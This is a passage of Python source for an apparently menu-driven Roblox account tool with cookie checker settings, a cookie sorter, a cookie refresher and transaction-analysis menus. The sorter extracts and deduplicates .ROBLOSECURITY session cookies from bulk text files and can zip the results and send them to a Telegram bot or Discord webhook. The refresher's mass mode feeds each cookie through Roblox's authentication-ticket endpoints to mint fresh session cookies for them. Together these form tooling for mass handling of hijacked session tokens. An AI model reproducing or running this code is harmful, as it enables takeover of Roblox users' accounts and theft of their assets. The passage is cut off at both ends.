            sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
            settingsRCCCustomPlacesPlaceGamepassesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
            if settingsRCCCustomPlacesPlaceGamepassesTab == '0': whileTrueStage6 = False
            elif settingsRCCCustomPlacesPlaceGamepassesTab.isdigit() and int(settingsRCCCustomPlacesPlaceGamepassesTab) <= len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']):
                config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses'][int(settingsRCCCustomPlacesPlaceGamepassesTab) - 1][2] ^= True
                await autoSaveConfig()
            elif settingsRCCCustomPlacesPlaceGamepassesTab in ('+', '='):
                for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']:
                    gamepass[2] = True
                await autoSaveConfig()
            elif settingsRCCCustomPlacesPlaceGamepassesTab in ('-', '_'):
                for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']:
                    gamepass[2] = False
                await autoSaveConfig()

            await cls()
            await lableASCII()

    async def printCustomPlaceBadges():
        for index, badge in enumerate(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if badge[2] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {badge[1]}{ANSI.CLEAR}\n')
    
    async def openCustomPlaceBadges():
        whileTrueStage6 = True
        await removeLinesCustomPlaces()
        while whileTrueStage6:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}\\{config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0]}\\{MT_Badges}{ANSI.CLEAR}\n\n')
            await printCustomPlaceBadges()
            sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
            settingsRCCCustomPlacesPlaceBadgesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
            if settingsRCCCustomPlacesPlaceBadgesTab == '0': whileTrueStage6 = False
            elif settingsRCCCustomPlacesPlaceBadgesTab.isdigit() and int(settingsRCCCustomPlacesPlaceBadgesTab) <= len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']):
                config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges'][int(settingsRCCCustomPlacesPlaceBadgesTab) - 1][2] ^= True
                await autoSaveConfig()
            elif settingsRCCCustomPlacesPlaceBadgesTab in ('+', '='):
                for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']:
                    badge[2] = True
                await autoSaveConfig()
            elif settingsRCCCustomPlacesPlaceBadgesTab in ('-', '_'):
                for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Badges']:
                    badge[2] = False
                await autoSaveConfig()

            await cls()
            await lableASCII()

    whileTrueStage5 = True
    await cls()
    await lableASCII()
    while whileTrueStage5:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}\\{config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0] if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0] != f'Unknown_Normal_{listOfRCCCustomPlaces[placeIndex]}' else config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][1] if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][1] != f'Unknown_Default_{listOfRCCCustomPlaces[placeIndex]}' else f'Unknown_{listOfRCCCustomPlaces[placeIndex]}'}{ANSI.CLEAR}\n\n')
        
        if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] and f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Gamepasses}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Badges}{ANSI.CLEAR}\n')
        elif f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces']:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Gamepasses}{ANSI.CLEAR}\n')
        elif f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Badges}{ANSI.CLEAR}\n')

        sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][2] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Check}\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
        settingsRCCPlacesPlaceTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
        match settingsRCCPlacesPlaceTab.upper():
            case '1':
                if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces']: await openCustomPlaceGamepasses()
                else: await openCustomPlaceBadges()
            case '2':
                if f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces'] and f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces']: await openCustomPlaceBadges()
                else: await removeLinesCustomPlaces()
            case 'C' | 'С':
                config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][2] ^= True
                await autoSaveConfig()
                await removeLinesCustomPlaces()
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    whileTrueStage6 = True
                    await removeLinesCustomPlaces()
                    while whileTrueStage6:
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}\\{config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0] if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0] != f'Unknown_Normal_{listOfRCCCustomPlaces[placeIndex]}' else config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][1] if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][1] != f'Unknown_Default_{listOfRCCCustomPlaces[placeIndex]}' else f'Unknown_{listOfRCCCustomPlaces[placeIndex]}'}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                        match confirmTheAction.upper():
                            case 'Y' | 'Н':
                                whileTrueStage5 = False
                                whileTrueStage6 = False

                                try: config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].remove(listOfRCCCustomPlaces[placeIndex])
                                except Exception: pass

                                for param in ['', '_Gamepasses', '_Badges']:
                                    try: config['Roblox']['CookieChecker']['CustomPlaces'].remove(f'{listOfRCCCustomPlaces[placeIndex]}{param}')
                                    except Exception: pass

                                try: listOfRCCCustomPlaces.remove(listOfRCCCustomPlaces[placeIndex])
                                except Exception: pass
                            case 'N' | 'Т':
                                whileTrueStage6 = False

                        await removeLines(8)
                else:
                    whileTrueStage5 = False
                    await removeLinesCustomPlaces()

                    try: config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].remove(listOfRCCCustomPlaces[placeIndex])
                    except Exception: pass

                    for param in ['', '_Gamepasses', '_Badges']:
                        try: config['Roblox']['CookieChecker']['CustomPlaces'].remove(f'{listOfRCCCustomPlaces[placeIndex]}{param}')
                        except Exception: pass

                    try: listOfRCCCustomPlaces.remove(listOfRCCCustomPlaces[placeIndex])
                    except Exception: pass

                await autoSaveConfig()
            case '0':
                whileTrueStage5 = False
                await removeLinesCustomPlaces()
            case 'F' | 'А':
                await cls()
                await lableASCII()
            case _:
                await removeLinesCustomPlaces()

def getCookieDataForSort():
    categoriesBoth = {}
    categoriesInt  = {}
    categoriesStr  = {}
    for category in cookieData.listOfCookieData:
        if category[3] == int:
            categoriesBoth[category[1]] = int
            categoriesInt[category[1]]  = int
        elif category[3] == str:
            categoriesBoth[category[1]] = str
            categoriesStr[category[1]]  = str
    return categoriesBoth, categoriesInt, categoriesStr

def printSortCategories(categories: list):
    for index, category in enumerate(categories):
        sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(categories))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if categories[category] == int and config['Roblox']['CookieChecker']['Sorting'][category][0] or categories[category] == str and config['Roblox']['CookieChecker']['Sorting'][category] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {' '.join(str(category).split('_'))}\n')

async def getSortValuesFromCategory(category: str, isCookieChecker: bool = False) -> list:
    listOfValues = config['Roblox']['CookieChecker']['Sorting'][category][1]

    if isCookieChecker:
        sortValuesForChecker = set()
        for i in range(len(listOfValues)):
            if listOfValues[i][1] and str(listOfValues[i][0]).isdigit(): sortValuesForChecker.add(int(listOfValues[i][0]))
        return sortValuesForChecker

    newSortValues = set()
    i = 0

    while len(listOfValues) > i:
        if str(listOfValues[i][0]).isdigit() and int(listOfValues[i][0]) not in newSortValues:
            newSortValues.add(int(listOfValues[i][0]))
            config['Roblox']['CookieChecker']['Sorting'][category][1][i][0] = int(listOfValues[i][0])
            i += 1
        else:
            config['Roblox']['CookieChecker']['Sorting'][category][1].pop(i)
    config['Roblox']['CookieChecker']['Sorting'][category][1] = sorted(config['Roblox']['CookieChecker']['Sorting'][category][1])
    await autoSaveConfig()
    return sorted(newSortValues)

async def removeIncorrectSortValues(categories):
    for category in categories:
        listValues = config['Roblox']['CookieChecker']['Sorting'][category][1]
        i = 0
        while len(listValues) > i:
            if not str(listValues[i][0]).isdigit():
                config['Roblox']['CookieChecker']['Sorting'][category][1].pop(i)
            else:
                i += 1
    await autoSaveConfig()

async def printSortValuesInCategory(sortValues: list, category: str):
    for index, sortValue in enumerate(sortValues):
        sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(sortValues))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Sorting'][category][1][index][1] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {sortValue}\n')

### Roblox Cookie Sorter

COOKIE_PATTERN = compile(r'_\|WARNING:-DO-NOT-SHARE-THIS\.--.*?\|_[^\s\r\n]+')

async def robloxCookieSorter():
    fileName = str(config['Roblox']['CookieSorter']['Output_Filename'])
    if any(char in fileName for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']) or fileName.strip() == '':
        fileName = 'output'

    files = [file for file in os.listdir('Roblox\\Cookie Sorter')
             if file.lower().endswith('.txt')]

    if not files:
        return await errorOrCorrectHandler(True, 8, MT_No_Cookie_Was_Found, f'{MT_Roblox}\\{MT_Cookie_Sorter}')

    dateOfCookieSorting = datetime.now().strftime('%d.%m.%Y - %H.%M.%S')
    cookieSortingList = set()
    countSorterUniqueCookies     = 0
    countSorterDuplicatedCookies = 0
    countSorterIncorrectCookies  = 0

    await removeLines(7)

    for file in files:
        counterOfCookies = 0
        fileWithCookies = open(f'Roblox\\Cookie Sorter\\{file}', 'r', encoding='UTF-8').readlines()
        sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Sorting_File} \'{ANSI.DECOR.UNDERLINE1}{file}{ANSI.CLEAR}\': 0 {MT_Of} {len(fileWithCookies)}')
        for line in fileWithCookies:
            try:
                cookie = search(COOKIE_PATTERN, line).group(0)
                if cookie not in cookieSortingList:
                    countSorterUniqueCookies += 1
                    cookieSortingList.add(cookie)
                else:
                    countSorterDuplicatedCookies += 1
            except AttributeError:
                countSorterIncorrectCookies += 1
            finally:
                counterOfCookies += 1
                sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Sorting_File} \'{ANSI.DECOR.UNDERLINE1}{file}{ANSI.CLEAR + ANSI.DECOR.BOLD}\': {counterOfCookies} {MT_Of} {len(fileWithCookies)}')

    os.makedirs(f'Roblox\\Cookie Sorter\\outputs\\{dateOfCookieSorting}', exist_ok=True)

    async with aiofiles.open(f'Roblox\\Cookie Sorter\\outputs\\{dateOfCookieSorting}\\{fileName}.txt', 'a', encoding='UTF-8') as file:
        for cookie in cookieSortingList:
            await file.write(f'{cookie}\n')

    sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Sorting_Complete}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Unique_Cookies_Found}: {countSorterUniqueCookies}\n [{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Duplicated_Cookies_Removed}: {countSorterDuplicatedCookies}\n [{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Incorrect_Cookies_Removed}: {countSorterIncorrectCookies}\n\n')
    if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()

    if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
        await makeArchive(f'Roblox\\Cookie Sorter\\outputs\\{dateOfCookieSorting}')

        messageText = f'*💜 {MT_Roblox} {MT_Cookie_Sorter.lower()}\n\n🟢 {MT_Unique_Cookies_Found}: {countSorterUniqueCookies} \n🟡 {MT_Duplicated_Cookies_Removed}: {countSorterDuplicatedCookies} \n🔴 {MT_Incorrect_Cookies_Removed}: {countSorterIncorrectCookies}*'

        if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot']:
            await sendMessageTelegramBot(str(config['Roblox']['General']['Outputs']['Telegram_Bot_Token']), str(config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']), messageText, f'Roblox\\Cookie Sorter\\outputs\\{dateOfCookieSorting}.zip')

        if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
            await sendMessageDiscordWebhook(str(config['Roblox']['General']['Outputs']['Discord_Webhook_URL']), messageText.replace('*', '**'), 'Roblox\\Cookie Sorter\\outputs', f'{dateOfCookieSorting}.zip')
        sys.stdout.write('\n')

    await waitingInput()

### Roblox Cookie Refresher

async def getXCSRFToken(cookieRoblox):
    async with ClientSession(cookies=cookieRoblox) as session:
        async with session.post(f'https://auth.roblox.com/v2/logout') as response:
            isXCSRFToken = response.headers['X-CSRF-Token']
            return isXCSRFToken

async def getRBXAuthenticationTicket(cookieRoblox, XCSRFToken):
    async with ClientSession(
        cookies=cookieRoblox,
        headers={
            'rbxauthenticationnegotiation': '1',
            'referer': 'https://www.roblox.com/hewhewhew',
            'Content-Type': 'application/json',
            'x-csrf-token': XCSRFToken
        }) as session:

        async with session.post(f'https://auth.roblox.com/v1/authentication-ticket') as response:
            isRBXAuthenticationTicket = response.headers['rbx-authentication-ticket']
            return isRBXAuthenticationTicket

async def getSetCookie(isRBXAuthenticationTicket):
    async with ClientSession(headers={'rbxauthenticationnegotiation': '1'}) as session:
        async with session.post(f'https://auth.roblox.com/v1/authentication-ticket/redeem', data={'authenticationTicket': isRBXAuthenticationTicket}) as response:
            isSetCookie = response.headers
            return isSetCookie

async def startSingleModeRCR(cookieRoblox: dict):
    isXCSRFToken              = await getXCSRFToken(cookieRoblox)
    isRBXAuthenticationTicket = await getRBXAuthenticationTicket(cookieRoblox, isXCSRFToken)
    isSetCookie               = await getSetCookie(isRBXAuthenticationTicket)
    return isSetCookie

async def startMassModeRCR(cookieRoblox: str, dateRefreshing: str):
    cookie = {'.ROBLOSECURITY': cookieRoblox}

    isValid = await isResponseStatusFromCookie(cookie)
    isSetCookie = await startSingleModeRCR(cookie) if isValid[3] else ''

    try:
        newCookie = search(COOKIE_PATTERN, str(isSetCookie)).group(0)[:-1]
    except Exception:
        newCookie = MT_Invalid_Cookie

    def saveCookie():
        os.makedirs(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateRefreshing}', exist_ok=True)
        oldCookie = f'{cookieRoblox[115:130]}...{cookieRoblox[-15:-1]}'
        if 1 in config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode']:
            open(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateRefreshing}\\refreshed_cookies_mode_1.txt', 'a', encoding='UTF-8').write(f'{oldCookie} -> {newCookie}\n')
        if 2 in config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode']:
            open(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateRefreshing}\\refreshed_cookies_mode_2.txt', 'a', encoding='UTF-8').write(f'{newCookie}\n')
        if 3 in config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode']:
            os.makedirs(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateRefreshing}\\refreshed_cookies_mode_3', exist_ok=True)
            open(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateRefreshing}\\refreshed_cookies_mode_3\\{oldCookie}.txt', 'a', encoding='UTF-8').write(f'{newCookie}\n')

    if newCookie != MT_Invalid_Cookie:
        saveCookie()
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {cookieRoblox[115:130]}...{cookieRoblox[-15:-1]} {ANSI.FG.CYAN}->{ANSI.CLEAR + ANSI.DECOR.BOLD} {newCookie[115:130]}...{newCookie[-15:-1]}{ANSI.CLEAR}\n')
    elif config['Roblox']['CookieRefresher']['MassMode']['Save_Invalid_Cookies']:
        saveCookie()
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {cookieRoblox[115:130]}...{cookieRoblox[-15:-1]} {ANSI.FG.CYAN}->{ANSI.CLEAR + ANSI.DECOR.BOLD} {MT_Invalid_Cookie}{ANSI.CLEAR}\n')
    else:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {cookieRoblox[115:130]}...{cookieRoblox[-15:-1]} {ANSI.FG.CYAN}->{ANSI.CLEAR + ANSI.DECOR.BOLD} {MT_Invalid_Cookie}{ANSI.CLEAR}\n')

### Transaction Analysis

async def printTAPlaces():
    listOfTAPlaces = list(config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'])
    if listOfTAPlaces:
        for index, place in enumerate(listOfTAPlaces):
            if str(listOfTAPlaces[index]).isdigit() and (str(listOfTAPlaces[index]) in config['Roblox']['TransactionAnalysis']['Places']):
                sys.stdout.write(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(listOfTAPlaces))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Places'][str(place)][2] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {config['Roblox']['TransactionAnalysis']['Places'][str(place)][1][0] if config['Roblox']['TransactionAnalysis']['Places'][str(place)][1][0] else f'Unknown_{place}'} {f'({config['Roblox']['TransactionAnalysis']['Places'][str(place)][0]})' if config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] else ''}\n')
            else:
                config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].remove(place)
        await autoSaveConfig()

async def TAPlaceContextMenu(placeIndex: int):
    listOfTAPlaces = [str(customPlace) for customPlace in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']
                      if str(customPlace).isdigit() and str(customPlace) in config['Roblox']['TransactionAnalysis']['Places']]

    async def printIgnoreNames():
        for index, ignoreName in enumerate(config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if ignoreName[1] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {ignoreName[0]}\n')

    whileTrueStage5 = True
    await cls()
    await lableASCII()
    while whileTrueStage5:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][0]}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Ignore_List}\n  ┃\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][2] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Check}\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
        settingsTAPlacesPlaceTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
        match settingsTAPlacesPlaceTab.upper():
            case '1':
                whileTrueStage6 = True
                await removeLines(9)
                while whileTrueStage6:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}\\{config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][0]}\\{MT_Ignore_List}{ANSI.CLEAR}\n\n')
                    await printIgnoreNames()
                    sys.stdout.write(f'{ANSI.DECOR.BOLD}{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Ignore_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_Not_Ignore_All}\n  ┃\n' if config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List'] else ''} [{ANSI.FG.YELLOW}A{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Add_A_Transaction}\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][3] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Discover_New_Names_For_Ignore_List}\n [{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Places'][listOfTAPlaces[placeIndex]][4] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Count_Robux_In_Total}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    settingsTAIgnoreListTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    if settingsTAIgnoreListTab == '0': whileTrueStage6 = False
                    elif settingsTAIgnoreListTab.isdigit() and int(settingsTAIgnoreListTab) <= len(config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List']):
                        whileTrueStage7 = True
                        ignoreItem = config['Roblox']['TransactionAnalysis']['Places'][f'{listOfTAPlaces[placeIndex]}_Ignore_List'][int(settingsTAIgnoreListTab) - 1]
                        await cls()
                        await lableASCII()
